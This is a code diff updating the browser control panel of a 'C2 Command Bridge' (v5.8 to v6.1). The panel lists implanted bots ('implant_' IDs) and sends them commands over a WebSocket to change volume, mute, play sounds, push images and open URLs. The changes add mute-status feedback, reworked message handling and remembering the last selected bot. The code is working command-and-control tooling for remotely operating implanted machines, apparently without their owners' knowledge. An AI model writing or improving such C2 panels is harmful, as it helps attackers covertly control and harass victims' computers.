@@ -1,12 +1,14 @@
 <!DOCTYPE html>
-<!-- Файл: index.html (Версия 5.8 - Возвращение к истокам) -->
+<!-- Файл: index.html (Версия 6.1 - с обратной связью) -->
 <html lang="ru">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Коммандный Мостик v5.8</title>
+    <title>C2 Коммандный Мостик v6.1</title>
     <style>
+        /* ... (все стили остаются без изменений) ... */
+        
         :root {
             --bg-color: #1a1a1c;
             --primary-color: #2e2e33;
@@ -288,7 +290,7 @@
 <body>
     <div class="container">
         <header>
-            <h1>Коммандный Мостик v5.8</h1></header>
+            <h1>Коммандный Мостик v6.1</h1></header>
 
         <main class="app-layout">
             <aside class="sidebar">
@@ -318,7 +320,7 @@
                             <div>
                                 <h3>Управление звуком</h3>
                                 <input type="range" id="volume-slider" min="0" max="100" value="50">
-                                <button class="btn-action" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
+                                <button class="btn-action" id="mute-btn" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
                             </div>
                             <div>
                                 <h3>Локальные звуки</h3>
@@ -345,7 +347,7 @@
 
     <script>
         // ==============================================================================
-        // JAVASCRIPT-МОЗГ (Твоя рабочая версия 2.0 + мой Кардиостимулятор и Логи)
+        // JAVASCRIPT-МОЗГ v6.1 (с обратной связью)
         // ==============================================================================
         const ui = {
             botList: document.getElementById('bot-list'),
@@ -355,6 +357,7 @@
             audioFilesList: document.getElementById('audio-files-list'),
             imageFilesList: document.getElementById('image-files-list'),
             volumeSlider: document.getElementById('volume-slider'),
+            muteButton: document.getElementById('mute-btn'),
             urlInput: document.getElementById('url-input'),
             logContainer: document.querySelector('.log-container'),
             logHeader: document.getElementById('log-header')
@@ -375,7 +378,6 @@
         function connect() {
             log("Подключение к C2...");
             if (pingInterval) clearInterval(pingInterval);
-
             socket = new WebSocket(`${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/ws`);
 
             socket.onopen = () => {
@@ -391,18 +393,24 @@
             socket.onmessage = (event) => {
                 if (event.data === 'pong') return;
                 const msg = JSON.parse(event.data);
-
-                // Твоя старая, рабочая логика обработки сообщений
-                if (msg.type === 'bot_list') {
-                    updateBotList(msg.data);
-                } else if (msg.type === 'bot_details' && msg.bot_id === selectedBotId) {
-                    handleBotDetails(msg.data);
-                } else if (msg.type === 'status') {
-                    log(`[SERVER] ${msg.data}`);
-                } else if (msg.type === 'volume_update' && msg.bot_id === selectedBotId) {
-                    if (msg.data.level !== undefined) ui.volumeSlider.value = msg.data.level;
-                } else if (msg.type === 'file_list_update' && msg.bot_id === selectedBotId) {
-                    if (msg.data.files) renderBotFiles(msg.data.files);
+                switch (msg.type) {
+                    case 'bot_list':
+                        updateBotList(msg.data);
+                        break;
+                    case 'bot_details':
+                        if (msg.bot_id === selectedBotId) handleBotDetails(msg.data);
+                        break;
+                    case 'status':
+                        log(`[${msg.bot_id ? msg.bot_id.replace('implant_','') : 'SERVER'}] ${msg.data}`);
+                        break;
+                        // <<< НОВАЯ ЛОГИКА ОБРАТНОЙ СВЯЗИ >>>
+                    case 'volume_update':
+                        if (msg.bot_id === selectedBotId) updateVolumeUI(msg.data);
+                        break;
+                    case 'file_list_update':
+                        if (msg.bot_id === selectedBotId)
+                            if (msg.data.files) renderBotFiles(msg.data.files);
+                        break;
                 }
             };
 
@@ -416,7 +424,7 @@
 
         function updateBotList(bots) {
             log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
-            const currentSelected = selectedBotId;
+            const savedBotId = localStorage.getItem('lastSelectedBot');
             ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
             bots.forEach(botId => {
                 const btn = document.createElement('button');
@@ -425,23 +433,29 @@
                 btn.onclick = () => selectBot(botId);
                 ui.botList.appendChild(btn);
             });
-            if (currentSelected && bots.includes(currentSelected)) {
-                selectBot(currentSelected, false);
+            if (savedBotId && bots.includes(savedBotId)) {
+                selectBot(savedBotId);
             } else {
-                selectBot(bots.length > 0 ? bots[0] : null, true);
+                selectBot(bots.length > 0 ? bots[0] : null);
             }
         }
 
-        function selectBot(botId, requestDetails = true) {
+        function selectBot(botId) {
             selectedBotId = botId;
+            if (botId) {
+                localStorage.setItem('lastSelectedBot', botId);
+            } else {
+                localStorage.removeItem('lastSelectedBot');
+            }
+
             document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
                 btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
             });
             if (botId) {
-                if (requestDetails) log(`Выбран бот: ${botId.replace('implant_', '')}`);
+                log(`Выбран бот: ${botId.replace('implant_', '')}`);
                 ui.controlsWrapper.style.display = 'block';
                 ui.selectedBotName.textContent = botId.replace('implant_', '');
-                if (requestDetails) socket.send(JSON.stringify({
+                socket.send(JSON.stringify({
                     type: 'get_details',
                     target_id: botId
                 }));
@@ -453,7 +467,15 @@
         function handleBotDetails(data) {
             log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
             if (data.files) renderBotFiles(data.files);
-            if (data.volume !== undefined) ui.volumeSlider.value = data.volume;
+            if (data.volume_state) updateVolumeUI(data.volume_state);
+        }
+
+        // <<< НОВАЯ ФУНКЦИЯ ДЛЯ ОБНОВЛЕНИЯ ИНТЕРФЕЙСА ЗВУКА >>>
+        function updateVolumeUI(state) {
+            log(`Обновление звука: Громкость ${state.level}%, Mute: ${state.is_muted}`);
+            ui.volumeSlider.value = state.level;
+            ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
+            ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
         }
 
         function renderBotFiles(files) {
